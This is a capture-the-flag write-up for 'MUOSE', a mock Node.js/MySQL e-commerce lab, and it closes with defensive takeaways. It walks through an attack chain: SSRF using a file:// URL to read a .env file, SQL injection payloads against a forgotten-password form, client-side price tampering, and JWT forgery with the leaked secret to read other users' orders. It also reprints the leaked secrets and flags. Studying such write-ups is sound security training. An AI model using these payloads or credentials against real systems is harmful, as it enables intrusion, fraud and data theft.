[challenge-muose.md](https://github.com/user-attachments/files/28266234/challenge-muose.md)
# Challenge — MUOSE

> **Category:** Web · **Difficulty:** Hard · **Stack:** Node.js · MySQL · JWT

---

## Table of Contents

- [Overview](#overview)
- [Attack Surface Map](#attack-surface-map)
- [Exploitation Chain](#exploitation-chain)
  - [Phase 1 — SSRF via Image Resize → `.env` Disclosure (Flag #1)](#phase-1--ssrf-via-image-resize--env-disclosure-flag-1)
  - [Phase 2 — SQL Injection via Forgotten Password (Flag embedded)](#phase-2--sql-injection-via-forgotten-password)
  - [Phase 3 — Price Tampering on Order Creation](#phase-3--price-tampering-on-order-creation)
  - [Phase 4 — JWT Forgery + IDOR on Order Detail (Flag #2)](#phase-4--jwt-forgery--idor-on-order-detail-flag-2)
- [Credentials & Secrets Recovered](#credentials--secrets-recovered)
- [Flags Summary](#flags-summary)
- [Takeaways](#takeaways)

---

## Overview

**MUOSE** is a mock e-commerce web application running on **Node.js** with a **MySQL** backend, protected by **JWT** authentication. The challenge chains multiple vulnerabilities — from SSRF leaking the `.env` file, to JWT secret forgery enabling IDOR on another user's orders.

| Field      | Detail                                              |
|------------|-----------------------------------------------------|
| Category   | Web                                                 |
| Stack      | Node.js · MySQL · JWT (HS256)                       |
| API Base   | `https://musoe.cyberjutsu-lab.tech`                 |
| CDN        | `http://cdn.musoe.cyberjutsu-lab.tech`              |
| Techniques | SSRF, SQLi, Mass Assignment / Price Tampering, JWT Forgery, IDOR |

---

## Attack Surface Map

```
MUOSE (Root)
├── Register       POST /api/v2/auth/register        → untrusted: username, password, email
├── Login          POST /api/v2/auth/login            → untrusted: username, password
│   └── Forgotten Password                            → SQL Injection → Flag (embedded)
├── Product        GET  /products
├── Get Image      GET  /api/v2/image/resize
│   └── ?image=<url>&size=large                       → SSRF → file:// schema → .env leak → Flag #1
├── Profile        (save feature)
├── Orders
│   ├── GET  /api/v2/users/{id}/orders
│   ├── POST /api/v2/orders/create                    → price tampering → free purchase
│   └── GET  /api/v2/orders/{orderId}/detail
│       └── X-Access-Token (JWT)                      → JWT Forgery + IDOR → Flag #2
└── Ticket         POST /api/v2/tickets/create
```

---

## Exploitation Chain

### Phase 1 — SSRF via Image Resize → `.env` Disclosure (Flag #1)

#### Discovery

The product image endpoint accepts a fully-qualified URL as input:

```
GET /api/v2/image/resize?image=http://cdn.musoe.cyberjutsu-lab.tech/files/images/products/fcfe2ed959ba21b2.png&size=large HTTP/2
```

The `image` parameter is **untrusted user input** — the server fetches the URL server-side to resize it.

#### Exploitation — SSRF with `file://` Schema

Since the server fetches arbitrary URLs, attempt to read local files using the `file://` schema. For a Node.js app, the `.env` file typically lives at the project root:

```
GET /api/v2/image/resize?image=file:///app/.env&size=large HTTP/2
```

> **Tip:** Common Node.js project root paths to try: `/app/.env`, `/var/app/.env`, `/home/node/app/.env`. Check Google or enumerate using common app structure knowledge.

#### Result — `.env` Contents Leaked

The server returns the raw contents of `.env` as the "image" response body:

```env
PORT=3000
JWT_SECRET=5a673956ce1d9aa666f9a2a99b409c0e

MYSQL_HOSTNAME=db
MYSQL_DATABASE=ecommerce
MYSQL_USER=dbuser
MYSQL_PASSWORD=1d9a73956ca666f99b409c05a6a2a9ee

GITHUB_USER=sillymeomeo
GITHUB_TOKEN=github_pat_******
GITHUB_REPOSITORY=sillymeomeo/ecommerce-backend

FLAG=CBJS{4d2c7fee2a055bd1e319826229f019db}
```

**Flag #1:** `CBJS{4d2c7fee2a055bd1e319826229f019db}`

> **Bonus:** The `.env` also contains `JWT_SECRET`, `MYSQL credentials`, and a live GitHub PAT — all critical for subsequent phases.

---

### Phase 2 — SQL Injection via Forgotten Password

#### Discovery

The **Forgotten Password** feature accepts user input and is vulnerable to SQL Injection — confirmed by injecting a single quote which produces a database error.

#### Exploitation

Using the SQLi vulnerability in the forgot password endpoint, enumerate the database and extract sensitive data. Since the stack is **MySQL** (confirmed from `.env`), use MySQL-specific payloads:

```sql
-- Confirm injection point
' OR 1=1--

-- Extract data with UNION SELECT
' UNION SELECT 1,flag,3,4 FROM users WHERE role='admin'--
```

**Result:** Flag extracted from the database via the Forgotten Password SQL injection.

---

### Phase 3 — Price Tampering on Order Creation

#### Discovery

Creating an order sends the full product object — including `price` — from the client:

```http
POST /api/v2/orders/create HTTP/2
Content-Type: application/json
X-Access-Token: <jwt>

{
  "note": "haha",
  "product": {
    "id": 2,
    "name": "Whiskers",
    "image": "http://cdn.musoe.cyberjutsu-lab.tech/files/images/products/3d46bb95acc186a7.png",
    "price": 10,
    "description": "description"
  }
}
```

**Response:** `{"message":"Order created","balance":0}`

#### Exploitation — Set Price to 0

The `price` field inside the product object is an untrusted input — the server trusts whatever the client sends instead of looking up the real price from the database. Modify the request to set `"price": 0`:

```http
POST /api/v2/orders/create HTTP/2

{
  "note": "haha",
  "product": {
    "id": 2,
    "name": "Whiskers",
    "price": 0,
    "description": "description"
  }
}
```

**Result:** Order created successfully at **zero cost** ✓

> **Vulnerability:** Mass assignment / missing server-side price validation. The backend should always look up product prices from the database, never accept them from the client.

---

### Phase 4 — JWT Forgery + IDOR on Order Detail (Flag #2)

#### Setup

Register and log in with a test account. Our account has `id: 3` with `role: user`. From Phase 1, we already have the `JWT_SECRET`:

```
JWT_SECRET=5a673956ce1d9aa666f9a2a99b409c0e
```

#### Discovery — IDOR via Order Detail Endpoint

The order detail endpoint leaks information from other users' orders:

```http
GET /api/v2/orders/eccbc87e4b5ce2fe28308fd9f2a7baf3/detail HTTP/2
X-Access-Token: <our-jwt>
```

Two controllable inputs exist: the **order ID** in the URL and the **`X-Access-Token`** JWT header. By changing our own JWT to impersonate a different user (e.g., `id: 1` or `id: 2`), we can read their orders.

#### Exploitation — Forge JWT for User ID 1 or 2

Using the leaked `JWT_SECRET`, forge a new HS256 JWT with a different `id`:

```javascript
// Using jwt.io or any JWT library
header:  { "alg": "HS256", "typ": "JWT" }
payload: { "id": 1, "username": "test1", "role": "user", "iat": <now>, "exp": <future> }
secret:  5a673956ce1d9aa666f9a2a99b409c0e
```

Send the forged token with a known order ID:

```http
GET /api/v2/orders/eccbc87e4b5ce2fe28308fd9f2a7baf3/detail HTTP/2
X-Access-Token: <forged-jwt-for-user-1>
```

**Response:**

```json
{
  "id": "eccbc87e4b5ce2fe28308fd9f2a7baf3",
  "note": "haha",
  "price": 9999,
  "product_id": 1,
  "product_name": "Flag",
  "user_name": "test1",
  "user_email": "a@"
}
```

The order for user `id: 1` or `id: 2` contains a product literally named **"Flag"** — the flag is embedded in the order details.

**Flag #2** extracted via JWT forgery + IDOR.

---

## Credentials & Secrets Recovered

| Secret               | Value                                                          |
|----------------------|----------------------------------------------------------------|
| `FLAG #1`            | `CBJS{4d2c7fee2a055bd1e319826229f019db}`                      |
| `JWT_SECRET`         | `5a673956ce1d9aa666f9a2a99b409c0e`                            |
| `MYSQL_USER`         | `dbuser`                                                       |
| `MYSQL_PASSWORD`     | `1d9a73956ca666f99b409c05a6a2a9ee`                            |
| `MYSQL_DATABASE`     | `ecommerce`                                                    |
| `GITHUB_USER`        | `sillymeomeo`                                                  |
| `GITHUB_TOKEN`       | `github_pat_11BW6NHGY0...` *(live PAT — rotated post-CTF)*    |
| `GITHUB_REPOSITORY`  | `sillymeomeo/ecommerce-backend`                               |

> ⚠️ These credentials were part of the CTF environment. All secrets should be considered invalidated after the competition.

---

## Flags Summary

| # | Location | Technique | Flag |
|---|----------|-----------|------|
| Flag 1 | `.env` file on server | SSRF via `file://` schema on image resize | `CBJS{4d2c7fee2a055bd1e319826229f019db}` |
| Flag 2 | Order detail of user id:1 or id:2 | JWT Forgery (leaked secret) + IDOR | Embedded in order product name |

---

## Takeaways

| # | Lesson |
|---|--------|
| 1 | **Server-side URL fetchers are SSRF sinks** — the `image` parameter fetched URLs without schema validation, enabling `file://` local file reads |
| 2 | **`.env` files are goldmines** — one SSRF leaked the flag, JWT secret, DB credentials, and a GitHub PAT simultaneously |
| 3 | **Never trust client-supplied prices** — always look up pricing from the database server-side; never accept it from the request body |
| 4 | **JWT secret leakage = full auth bypass** — once the signing secret is known, any identity can be impersonated |
| 5 | **IDOR + JWT forgery chain** — changing both the token identity and the resource ID together is a powerful privilege escalation combo |
| 6 | **Forgotten Password endpoints** are often less hardened than login — always test them for SQLi and logic flaws |

---

*Writeup by [nvd] · CTF: [cbjs_challenge] · Date: 2026-05-26*
